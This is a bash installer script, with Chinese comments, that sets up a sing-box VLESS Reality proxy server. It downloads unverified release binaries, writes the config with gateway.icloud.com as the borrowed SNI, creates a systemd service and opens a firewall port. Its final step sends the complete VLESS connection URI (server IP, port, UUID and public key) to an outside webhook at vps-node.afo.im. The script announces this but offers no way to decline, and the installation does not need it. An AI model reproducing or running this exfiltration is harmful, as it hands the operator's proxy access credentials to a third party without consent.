#!/bin/bash

set -e

# 安装目录和配置路径
INSTALL_DIR="/usr/local/bin"
CONFIG_DIR="/etc/sing-box"
SERVICE_FILE="/etc/systemd/system/sing-box.service"

# 生成随机端口（10000-65535）
PORT=$((RANDOM % 55535 + 10000))
# 生成UUID
UUID=$(cat /proc/sys/kernel/random/uuid)
# 生成 Reality 密钥对
KEY_PAIR=$(sing-box generate reality-keypair 2>/dev/null || true)
if [[ -z "$KEY_PAIR" ]]; then
  echo "[*] sing-box 未安装，先临时安装一个旧版本用于生成密钥..."
  TEMP_DIR=$(mktemp -d)
  cd "$TEMP_DIR"
  curl -sLO https://github.com/SagerNet/sing-box/releases/download/v1.4.7/sing-box-1.4.7-linux-amd64.tar.gz
  tar -xzf sing-box-1.4.7-linux-amd64.tar.gz
  ./sing-box generate reality-keypair > reality_keys.txt
  PRIVATE_KEY=$(awk '/PrivateKey/ {print $2}' reality_keys.txt)
  PUBLIC_KEY=$(awk '/PublicKey/ {print $2}' reality_keys.txt)
  cd - && rm -rf "$TEMP_DIR"
else
  PRIVATE_KEY=$(echo "$KEY_PAIR" | awk '/PrivateKey/ {print $2}')
  PUBLIC_KEY=$(echo "$KEY_PAIR" | awk '/PublicKey/ {print $2}')
fi

SNI="gateway.icloud.com"
SHORT_ID=$(openssl rand -hex 8)

install_singbox() {
  echo "[+] 安装 sing-box 最新版本..."
  ARCH="amd64"
  TEMP_DIR=$(mktemp -d)
  cd "$TEMP_DIR"
  LATEST_URL=$(curl -s https://api.github.com/repos/SagerNet/sing-box/releases/latest \
    | grep "browser_download_url" \
    | grep "linux-$ARCH.tar.gz" \
    | cut -d '"' -f 4)
  curl -LO "$LATEST_URL"
  tar -xzf sing-box-*-linux-$ARCH.tar.gz
  install sing-box-*/sing-box "$INSTALL_DIR"
  mkdir -p "$CONFIG_DIR"
  cd - && rm -rf "$TEMP_DIR"
}

generate_config() {
  cat > "$CONFIG_DIR/config.json" <<EOF
{
  "log": {
    "level": "info",
    "output": "console"
  },
  "inbounds": [
    {
      "type": "vless",
      "listen": "::",
      "listen_port": $PORT,
      "users": [
        {
          "uuid": "$UUID",
          "flow": ""
        }
      ],
      "tls": {
        "enabled": true,
        "server_name": "$SNI",
        "reality": {
          "enabled": true,
          "handshake": {
            "server": "$SNI",
            "server_port": 443
          },
          "private_key": "$PRIVATE_KEY",
          "short_id": ["$SHORT_ID"]
        }
      }
    }
  ],
  "outbounds": [
    {
      "type": "direct"
    }
  ]
}
EOF
}

create_service() {
  cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=sing-box service
After=network.target

[Service]
ExecStart=$INSTALL_DIR/sing-box run -c $CONFIG_DIR/config.json
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reexec
  systemctl daemon-reload
  systemctl enable sing-box
  systemctl restart sing-box
}

open_port() {
  if command -v ufw >/dev/null 2>&1; then
    ufw allow $PORT/tcp
  elif command -v iptables >/dev/null 2>&1; then
    iptables -I INPUT -p tcp --dport $PORT -j ACCEPT
  else
    echo "[*] 未检测到 ufw 或 iptables，端口可能未开放，请手动确认 $PORT 端口"
  fi
}

main() {
  install_singbox
  generate_config
  create_service
  open_port

  IP=$(curl -s https://ipinfo.io/ip)
  VLESS_URI="vless://$UUID@$IP:$PORT?encryption=none&flow=&security=reality&sni=$SNI&fp=chrome&pbk=$PUBLIC_KEY&sid=$SHORT_ID&type=tcp#vless-reality"

  echo -e "\n✅ 安装完成！以下是连接信息：\n"
  echo "协议: VLESS Reality"
  echo "地址: $IP"
  echo "端口: $PORT"
  echo "UUID: $UUID"
  echo "公钥: $PUBLIC_KEY"
  echo "SNI: $SNI"
  echo "Short ID: $SHORT_ID"
  echo -e "\n📎 VLESS URI:\n"
  echo "$VLESS_URI"

  echo -e "\n[+] 发送 VLESS URI 到远程服务器 webhook..."
  curl --location 'https://vps-node.afo.im/add' \
       --header 'Content-Type: text/plain' \
       --data "$VLESS_URI"

  echo -e "\n[+] 发送完成！"
}

main
